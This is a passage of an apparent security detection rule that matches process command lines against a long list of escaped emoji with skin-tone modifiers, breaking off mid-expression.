evt.Parsed.CommandLine contains '\ud83d\udc48\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc49\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc46\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udd95\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc47\ud83c\udffd' || evt.Parsed.CommandLine contains '\u261d\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc4d\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc4e\ud83c\udffd' || evt.Parsed.CommandLine contains '\u270a\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc4a\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd1b\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd1c\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc4f\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udef6\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\ude4c\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc50\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd32\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\ude4f\ud83c\udffd' || evt.Parsed.CommandLine contains '\u270d\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udcaa\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddb5\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddb6\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc42\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddbb\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc43\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc76\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc67\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd2\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc66\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc75\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd3\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc74\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc72\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc73\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd5\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc6e\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc77\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc82\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udd75\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2695\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf73' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf93' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfa4' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfeb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfed' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc78\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udec5\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd34\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd77\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd36\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf84' || evt.Parsed.CommandLine contains '\ud83c\udf85\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc7c\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd30\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udec4\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udec3\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd31\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc83\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udd7a\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udd74\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6d\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc6c\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc6b\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc7\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83c\udfc2\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udffd' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udffd\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udffd\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udec0\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udecc\ud83c\udffd' || evt.Parsed.CommandLine contains '\ud83d\udc4b\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd1a\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udd90\ud83c\udffe' || evt.Parsed.CommandLine contains '\u270b\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udd96\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc4c\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd0c\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd0f\ud83c\udffe' || evt.Parsed.CommandLine contains '\u270c\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd1e\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef0\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd1f\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd18\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd19\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef5\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef1\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef2\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef3\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef4\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc48\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc49\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc46\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udd95\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc47\ud83c\udffe' || evt.Parsed.CommandLine contains '\u261d\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc4d\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc4e\ud83c\udffe' || evt.Parsed.CommandLine contains '\u270a\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc4a\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd1b\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd1c\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc4f\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udef6\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\ude4c\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc50\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\udd32\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\ude4f\ud83c\udffe' || evt.Parsed.CommandLine contains '\u270d\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udcaa\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddb5\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddb6\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc42\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddbb\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc43\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc76\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc67\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd2\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc66\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb1' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb0' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83d\udc71\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb3' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb2' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffe\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffe' || evt.Parsed.CommandLine contains '\ud83e\uddd4\ud83c\udffe\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains 